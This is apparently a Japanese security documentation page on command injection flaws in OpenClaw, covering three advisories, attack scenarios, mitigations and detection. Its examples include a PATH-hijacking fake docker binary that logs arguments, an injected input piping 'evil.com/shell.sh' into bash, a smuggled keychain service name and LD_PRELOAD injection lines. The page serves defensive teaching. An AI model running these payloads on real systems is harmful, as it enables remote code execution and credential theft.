# コマンドインジェクション

## 概要

コマンドインジェクション脆弱性により、攻撃者はシステムコールに悪意のあるコマンドを注入し、任意のコード実行を引き起こすことができます。OpenClawでは、環境変数操作、SSHコマンド構築、シェルベースの認証情報操作でコマンドインジェクションが発見されています。

**影響**: リモートコード実行、権限昇格、システム全体の侵害。

**RCEとの関係**: コマンドインジェクションは、悪意のあるコマンドがシェル操作に注入される特定のタイプのRCE攻撃です。[RCE脆弱性](./rce.md)はより広範なコード実行攻撃をカバーしますが、コマンドインジェクションはシェルコマンド操作に焦点を当てています。

## 脆弱性リスト

### High（高）

| アドバイザリ | CVE | 概要 | 修正バージョン |
|----------|-----|---------|----------|
| [GHSA-mc68-q9jw-2h3v](https://github.com/openclaw/openclaw/security/advisories/GHSA-mc68-q9jw-2h3v) | — | Docker実行中のPATH環境変数経由のコマンドインジェクション | v2026.1.29 |
| [GHSA-q284-4pvr-m585](https://github.com/openclaw/openclaw/security/advisories/GHSA-q284-4pvr-m585) | CVE-2026-25157 | sshNodeCommandのOSコマンドインジェクション | v2026.1.29 |
| [GHSA-4564-pvr2-qq4h](https://github.com/openclaw/openclaw/security/advisories/GHSA-4564-pvr2-qq4h) | CVE-2026-27487 | macOS Keychainクレデンシャル書き込み時のシェルインジェクション | v2026.2.14 |

**合計**: 3件のアドバイザリ（全て高深刻度）

## 攻撃シナリオ

### 1. PATH環境変数インジェクション (GHSA-mc68-q9jw-2h3v)

**攻撃ベクター**: Docker操作中に`PATH`環境変数を操作して、コマンド実行を攻撃者制御のバイナリにリダイレクト。

**例**:
```bash
# 攻撃者が悪意のあるディレクトリを含むようにPATHを設定
export PATH="/tmp/evil:$PATH"

# 悪意のある'docker'バイナリを作成
cat > /tmp/evil/docker << 'EOF'
#!/bin/bash
# 認証情報をログに記録して実際のdockerに転送
echo "Intercepted: $@" >> /tmp/stolen.log
/usr/bin/docker "$@"
EOF
chmod +x /tmp/evil/docker

# OpenClawが'docker'コマンドを実行、攻撃者のバイナリが実行される
# 攻撃者がシークレットを含む全dockerアーギュメントを傍受
```

**影響**:
- 認証情報の窃取（dockerクレデンシャル、APIキー）
- コマンド操作
- コンテナエスケープ

### 2. sshNodeCommandインジェクション (GHSA-q284-4pvr-m585, CVE-2026-25157)

**攻撃ベクター**: SSHノードコマンドパラメータにシェルメタキャラクタを注入し、リモートノードで任意のコマンドを実行。

**例**:
```javascript
// 脆弱なコード（簡略化）
const nodeCommand = `ssh user@${nodeHost} "${userInput}"`;
exec(nodeCommand);

// 攻撃者の入力
userInput = 'benign_command"; curl http://evil.com/shell.sh | bash #'

// 実行されるコマンド
// ssh user@node "benign_command"; curl http://evil.com/shell.sh | bash #"
```

**影響**:
- SSHノードでのリモートコード実行
- マルチノードデプロイメントでのラテラルムーブメント
- 認証情報の収集

### 3. macOS Keychainシェルインジェクション (GHSA-4564-pvr2-qq4h, CVE-2026-27487)

**攻撃ベクター**: 認証情報書き込み操作中に、keychainサービス名またはアカウント名パラメータを通じてシェルコマンドを注入。

**例**:
```bash
# 脆弱なkeychain操作（簡略化）
security add-generic-password -s "$serviceName" -a "$accountName" -w "$password"

# 攻撃者制御のサービス名
serviceName='MyService"; echo "pwned" > /tmp/hacked; #'

# 実行されるコマンド
# security add-generic-password -s "MyService"; echo "pwned" > /tmp/hacked; #" -a "user" -w "pass"
```

**影響**:
- ユーザー権限での任意のコマンド実行
- Keychainデータの流出
- 永続的なバックドアのインストール

## 一般的なインジェクション技術

### シェルメタキャラクタインジェクション

| メタキャラクタ | 目的 | 例 |
|--------------|---------|---------|
| `;` | コマンド区切り | `cmd1; cmd2` |
| `&&` | AND演算子 | `cmd1 && cmd2` |
| `\|` | パイプ演算子 | `cmd1 \| cmd2` |
| `$()` | コマンド置換 | `$(malicious_cmd)` |
| `` ` `` | コマンド置換（バッククォート） | `` `malicious_cmd` `` |
| `>` | 出力リダイレクト | `cmd > /tmp/output` |
| `#` | コメント（残りを無視） | `cmd #ignore_this` |
| `\n` | 改行インジェクション | `cmd\nmalicious_cmd` |

### 環境変数操作

```bash
# PATHインジェクション
PATH="/tmp/evil:$PATH"

# LD_PRELOADインジェクション（Linux）
LD_PRELOAD="/tmp/evil.so"

# DYLD_INSERT_LIBRARIESインジェクション（macOS）
DYLD_INSERT_LIBRARIES="/tmp/evil.dylib"
```

## 緩和策

### 1. シェル実行を避ける

**ベストプラクティス**: シェルコマンドの代わりに直接システムコールを使用する。

```javascript
// ❌ 脆弱 - シェルを使用
const { exec } = require('child_process');
exec(`ssh user@${host} ${command}`);

// ✅ 安全 - シェルなし
const { execFile } = require('child_process');
execFile('ssh', ['user@' + host, command], { shell: false });
```

### 2. 入力検証とサニタイゼーション

**ホワイトリストアプローチ**（推奨）:
```javascript
function sanitizeCommand(input) {
  // 英数字、ダッシュ、アンダースコアのみ許可
  if (!/^[a-zA-Z0-9_-]+$/.test(input)) {
    throw new Error('Invalid command');
  }
  return input;
}
```

**特殊文字のエスケープ**（フォールバック）:
```javascript
function escapeShellArg(arg) {
  // シングルクォートで囲み、シングルクォートをエスケープ
  return "'" + arg.replace(/'/g, "'\\''") + "'";
}
```

### 3. パラメータ化APIの使用

利用可能な場合は、エスケープを自動的に処理するパラメータ化APIを使用:

```javascript
// ✅ パラメータ化SSH実行
const { NodeSSH } = require('node-ssh');
const ssh = new NodeSSH();
await ssh.connect({ host, username, privateKey });
await ssh.execCommand(command); // 自動的にエスケープ
```

### 4. 環境変数のハードニング

**環境のサニタイズ**:
```javascript
// 危険な環境変数を削除
const safeEnv = {
  ...process.env,
  PATH: '/usr/bin:/bin', // PATHをリセット
  LD_PRELOAD: undefined,
  DYLD_INSERT_LIBRARIES: undefined
};

execFile('command', args, { env: safeEnv });
```

**PATHの検証**:
```javascript
function validatePath(path) {
  const safePaths = ['/usr/bin', '/bin', '/usr/local/bin'];
  const pathDirs = path.split(':');

  for (const dir of pathDirs) {
    if (!safePaths.includes(dir)) {
      throw new Error(`Unsafe PATH directory: ${dir}`);
    }
  }
}
```

### 5. プラットフォーム固有の防御

#### macOS Keychain操作

```bash
# ✅ 適切なクォートでkeychain APIを使用
security add-generic-password \
  -s "$(printf '%s' "$serviceName")" \
  -a "$(printf '%s' "$accountName")" \
  -w "$(printf '%s' "$password")"
```

#### SSHコマンド構築

```javascript
// ✅ パラメータ化されたssh-execライブラリを使用
const sshExec = require('ssh-exec');
sshExec(command, {
  host: host,
  user: user,
  key: privateKey
}, (err, stdout, stderr) => {
  // コマンドが安全に実行される
});
```

### 6. ランタイム監視

コマンドインジェクション試行を検出するためにランタイムチェックを有効化:

```bash
# exec呼び出しの監査ログを有効化
auditctl -w /usr/bin/bash -p x -k command_exec
auditctl -w /bin/sh -p x -k command_exec

# 疑わしい環境変数を監視
auditctl -w /proc/self/environ -p r -k env_read
```

## 検出

### 静的解析

```bash
# 脆弱なexecパターンを検索
grep -r "exec(" --include="*.js" --include="*.ts"
grep -r "spawn(" --include="*.js" --include="*.ts"
grep -r "child_process" --include="*.js" --include="*.ts"

# シェル呼び出しをチェック
grep -r "shell: true" --include="*.js" --include="*.ts"
```

### ランタイム検出

**ログ解析**:
```bash
# コマンドログでシェルメタキャラクタをチェック
grep -E '[;|&$`]' /var/log/openclaw/commands.log

# PATH操作を監視
grep "PATH=" /var/log/openclaw/audit.log
```

**異常検出**:
- 予期しないコマンド実行
- 非標準のPATH値
- LD_PRELOADまたはDYLD_INSERT_LIBRARIESの設定

## 関連リソース

- **脆弱性ドキュメント**:
  - [RCE脆弱性](./rce.md) - より広範なRCE攻撃ベクター
  - [Execバイパス](./exec-bypass.md) - Execホワイトリストバイパス技術
- **テスト**: `tests/agent-hijack/`ディレクトリにテストケースがあります（テスト6、7、8）
- **ベストプラクティス**:
  - [ハードニングガイド - コマンド実行](../best-practices/hardening-guide.md)
- **テストガイド**: [エージェントハイジャックテストガイド](../test-cases/agent-hijack-guide.md)

## 参考資料

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CWE-88**: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')
- **CWE-77**: Improper Neutralization of Special Elements used in a Command ('Command Injection')
- **OWASP**: [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- **MITRE ATT&CK**: T1059 (Command and Scripting Interpreter)
